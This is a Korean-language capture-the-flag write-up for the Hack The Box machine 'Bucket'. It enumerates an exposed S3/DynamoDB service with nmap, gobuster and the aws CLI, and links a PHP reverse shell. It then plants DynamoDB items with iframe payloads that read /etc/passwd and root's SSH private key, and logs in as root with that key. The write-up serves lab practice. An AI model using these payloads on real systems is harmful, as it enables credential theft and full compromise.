초기스캔

```bash
nmap -v 10.10.10.212 -sC -sV -oN nmap/initial
```

```bash
nmap -A -p- 10.10.10.212 -oN nmap/all-ports
```

```bash
gobuster dir -u http://s3.bucket.htb -w /opt/directory-list-2.3-medium.txt
```

```bash
curl http://s3.bucket.htb/health 
````

{"services": {"s3": "running", "dynamodb": "running"}}

```text
┌──(kali㉿kali)-[~/…/htb/box/bucket/nmap]
└─$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
{
    "TableNames": [
        "users"
    ]
}
```

```aws
aws dynamodb get-item --consistent-read \
    --table-name users \
    --endpoint-url http://s3.bucket.htb
```
위 명령어는 key가 필요하다고 한다.

```aws
aws dynamodb scan \
     --table-name Thread \
     --filter-expression "LastPostedBy = :name" \
     --expression-attribute-values '{":name":{"S":"User A"}}'
```

```aws
aws dynamodb scan \
     --table-name users \
     --endpoint-url http://s3.bucket.htb
```

```aws
aws s3api list-buckets --endpoint-url http://s3.bucket.htb
```
bucket name 특정

```aws
aws s3api list-buckets --endpoint-url http://s3.bucket.htb
```

해당 버킷의 네임 획득 이후 ls로 디렉터리 조회

```aws
aws s3 ls adserver/images/ --endpoint-url http://s3.bucket.htb
```


```aws
aws s3 cp test.txt s3://adserver/images/ --endpoint-url http://s3.bucket.htb
```

테스트 파일 업로드 시도, 업로드는 정상적으로 수행

https://github.com/pentestmonkey/php-reverse-shell

```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
        AttributeName=data,AttributeType=S \
    --key-schema \
        AttributeName=title,KeyType=HASH \
        AttributeName=data,KeyType=RANGED  \
    --endpoint-url http://s3.bucket.htb \
    --provisioned-throughput \
        ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --table-class STANDARD
```

```bash
aws dynamodb scan \
     --table-name alerts \
     --endpoint-url http://s3.bucket.htb
```     

```bash
aws dynamodb put-item \
    --table-name alerts \
    --item file://item.json \
    --endpoint-url http://s3.bucket.htb
```

```bash
curl -X POST vendor/autoload.php --data={
    "action" : "get_alerts"}
```

```json
{
    "title": {"S": "Ransomware"},
    "data": {"S": "<html><head><body><iframe src=\"/etc/passwd\"></body></head></html>"}
}
```
```json
{
    "title": {"S": "Ransomware"},
    "data": {"S": "<html><head><body><iframe src=\"/root/.ssh/id_rsa\"></body></head></html>"}
}
```

#id_rsa 개인키 획득후

```shell
ssh -i id_rsa root@bucket.htb
```

root 접속
